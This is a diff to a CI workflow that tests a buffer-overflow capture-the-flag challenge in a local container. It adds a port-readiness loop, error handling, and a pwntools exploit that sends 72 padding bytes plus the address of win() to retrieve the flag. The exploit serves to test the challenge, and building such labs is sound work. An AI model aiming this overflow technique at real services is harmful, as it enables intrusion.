@@ -112,7 +112,28 @@ jobs:
             -p 4444:4444 \
             -p 5000:5000 \
             example-bof:test
-          sleep 2
+
+          # Wait for container to be healthy and services ready
+          for i in {1..30}; do
+            if docker ps | grep -q test-challenge && timeout 1 bash -c "cat < /dev/null > /dev/tcp/localhost/4444" 2>/dev/null; then
+              echo "Challenge service is ready"
+              break
+            fi
+            if ! docker ps | grep -q test-challenge; then
+              echo "Container exited unexpectedly"
+              docker logs test-challenge
+              exit 1
+            fi
+            echo "Waiting for challenge service... ($i/30)"
+            sleep 1
+          done
+
+          # Final check
+          if ! docker ps | grep -q test-challenge; then
+            echo "Container failed to start"
+            docker logs test-challenge
+            exit 1
+          fi
 
       - name: Install pwntools
         run: pip3 install pwntools
@@ -121,29 +142,47 @@ jobs:
         run: |
           python3 << 'EOF'
           import subprocess
+          import sys
           from pwn import *
 
           context.arch = 'amd64'
           context.log_level = 'info'
 
+          # Check container is running
+          result = subprocess.run(['docker', 'ps', '--filter', 'name=test-challenge', '--format', '{{.Names}}'],
+                                  capture_output=True, text=True)
+          if 'test-challenge' not in result.stdout:
+              print("ERROR: Container not running!")
+              print("Container logs:")
+              subprocess.run(['docker', 'logs', 'test-challenge'])
+              sys.exit(1)
+
           # Extract binary from container
-          subprocess.run(['docker', 'cp', 'test-challenge:/challenge/pwn_binary', '/tmp/pwn_binary'], check=True)
+          result = subprocess.run(['docker', 'cp', 'test-challenge:/challenge/pwn_binary', '/tmp/pwn_binary'],
+                                  capture_output=True, text=True)
+          if result.returncode != 0:
+              print(f"ERROR: Failed to copy binary: {result.stderr}")
+              sys.exit(1)
 
           binary = ELF('/tmp/pwn_binary')
           win_addr = binary.symbols['win']
           log.info(f"win() at: {hex(win_addr)}")
 
           # Exploit
-          conn = remote('localhost', 4444)
-          conn.recvuntil(b'Enter input: ')
-          payload = b'A' * 72 + p64(win_addr)
-          conn.sendline(payload)
-          output = conn.recvall(timeout=3)
-          print(f"Output: {output}")
+          conn = remote('localhost', 4444, timeout=10)
+          try:
+              conn.recvuntil(b'Enter input: ', timeout=5)
+              payload = b'A' * 72 + p64(win_addr)
+              conn.sendline(payload)
+              output = conn.recvall(timeout=5)
+              print(f"Output: {output}")
 
-          assert b'CTF{' in output, f"Exploit failed! Output: {output}"
-          print("Exploit successful!")
-          conn.close()
+              if b'CTF{' not in output:
+                  print(f"ERROR: Exploit failed! Output: {output}")
+                  sys.exit(1)
+              print("Exploit successful!")
+          finally:
+              conn.close()
           EOF
 
       - name: Test flag verifier endpoint
@@ -160,4 +199,7 @@ jobs:
 
       - name: Stop challenge container
         if: always()
-        run: docker stop test-challenge
+        run: |
+          # Stop container if still running, ignore errors
+          docker stop test-challenge 2>/dev/null || true
+          docker rm -f test-challenge 2>/dev/null || true
